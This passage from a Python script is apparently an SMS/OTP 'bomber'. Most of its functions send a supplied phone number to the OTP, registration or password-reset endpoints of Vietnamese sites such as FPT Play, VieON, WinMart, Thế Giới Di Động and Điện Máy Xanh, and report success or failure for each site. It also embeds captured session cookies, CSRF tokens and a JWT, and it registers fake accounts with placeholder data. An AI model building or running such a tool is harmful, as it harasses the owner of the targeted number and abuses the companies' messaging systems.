        'X-XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    try:
        response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDICARE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDICARE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tokyolife():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': '260a5bdf2a783bc889dcf22852ff0c5e',
        'timestamp': '1721494339686',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'tran th1nk',
        'password': '123123123a',
        'email': 'ret43ht6@gmail.com',
        'birthday': '2003-10-01',
        'gender': 'male',
    }

    try:
        response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TOKYOLIFE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TOKYOLIFE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptreg():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=6j5x6nett8jkCfcK_qAYHg&e=1721803584&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptreset():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=oIfVfDi61oLPs9G1htsfEw&e=1721803775&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'email': '',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=f8BaG8rdfwZq825-0vCokg&e=1721803855&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def winmart():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'tran tranh',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '1996-07-12',
        'gender': 'Male',
    }

    try:
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tgdidong():
    cookies = {
        '_ga': 'GA1.1.383137769.1707219496',
        '_pk_id.7.8f7e': '98ddc5d43340bec9.1707219498.',
        '_tt_enable_cookie': '1',
        '_ttp': 'lc7jJkDQUTphqZNKGUgbp4UXsVT',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
        '_gcl_au': '1.1.1960895612.1715007168',
        '_ce.s': 'v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560',
        '___utmvm': '###########',
        'ASP.NET_SessionId': 'kkussnf30znrftqduwbdzoaz',
        '_fbp': 'fb.1.1719755336237.751784073551657802',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1',
        '_ga_TLRZMSX5ME': 'GS1.1.1719755335.46.1.1719755823.59.0.0',
        '__RequestVerificationToken_L2dhbWUtYXBw0': 'rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1',
        'TBMCookie_3209819802479625248': '704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8',
        'SvID': 'beline2682|Zpxsx|ZpxsL',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_ga=GA1.1.383137769.1707219496; _pk_id.7.8f7e=98ddc5d43340bec9.1707219498.; _tt_enable_cookie=1; _ttp=lc7jJkDQUTphqZNKGUgbp4UXsVT; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1960895612.1715007168; _ce.s=v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560; ___utmvm=###########; ASP.NET_SessionId=kkussnf30znrftqduwbdzoaz; _fbp=fb.1.1719755336237.751784073551657802; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1; _ga_TLRZMSX5ME=GS1.1.1719755335.46.1.1719755823.59.0.0; __RequestVerificationToken_L2dhbWUtYXBw0=rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1; TBMCookie_3209819802479625248=704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8; SvID=beline2682|Zpxsx|ZpxsL',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNmcyxqfG4iox8M-NAgV5Q8ffXIQLpqWRkUg7FNMCcXbDGttXTUOUmdIpQ_KvOdMghelaFFw19tC0tdNruWUKkJSdyIXgff-CzqyfSx-6wOmYxTRqCMnxQsHfxdy9qova8',
    }

    try:
        response = requests.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TGDIDONG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TGDIDONG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dienmayxanh():
    cookies = {
        '_ga': 'GA1.1.939547831.1707797103',
        '_pk_id.8.8977': 'e802b602f6107cf3.1707797103.',
        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1715006306.6.1.1715006470.35.0.0',
        '_ce.s': 'v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672',
        'DMX_View': 'DESKTOP',
        'DMX_Personal': '%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d',
        '___utmvm': '###########',
        'TBMCookie_3209819802479625248': '776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2693|ZpxwU|ZpxwT',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_ga=GA1.1.939547831.1707797103; _pk_id.8.8977=e802b602f6107cf3.1707797103.; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _ga_Y7SWKJEHCE=GS1.1.1715006306.6.1.1715006470.35.0.0; _ce.s=v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672; DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d; ___utmvm=###########; TBMCookie_3209819802479625248=776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2693|ZpxwU|ZpxwT; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU",
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TT5ZU_rJVhy8x3F_L2DiqjDc1L_VRbJiGtF6nRoVvDLPby5ttmADmlIwjASFbRoQXmnFIpyCwkWErImoHvqHc6D1Vb9shU3Z3n67mDZCKqSmU5PWGqoH6wMh-UqswE9EQ',
    }

    try:
        response = requests.post(
            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DIENMAYXANH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DIENMAYXANH | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def meta():
    cookies = {
        '_ssid': 'kfeiac30ctlo2jkxrl4b2gls',
        '__ckref': 'performance-sale',
        '_cart_': '0ea51858-1f80-4165-8840-74939d5e3d75',
        '__ckmid': '0e43463633164e028245b4bf873328d6',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_ssid=kfeiac30ctlo2jkxrl4b2gls; __ckref=performance-sale; _cart_=0ea51858-1f80-4165-8840-74939d5e3d75; __ckmid=0e43463633164e028245b4bf873328d6',
        'origin': 'https://meta.vn',
        'priority': 'u=1, i',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/history',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': sdt,
            'type': 'phone',
        },
        'api_method': 'CheckRegister',
    }

    try:
        response = requests.post(
            'https://meta.vn/app_scripts/pages/AccountReact.aspx',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("META | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("META | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thefaceshop():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'cf709515be3685bb734f1c6bcb30bffc',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721530092656',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THEFACESHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THEFACESHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bestexpress():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'accept': 'application/json',
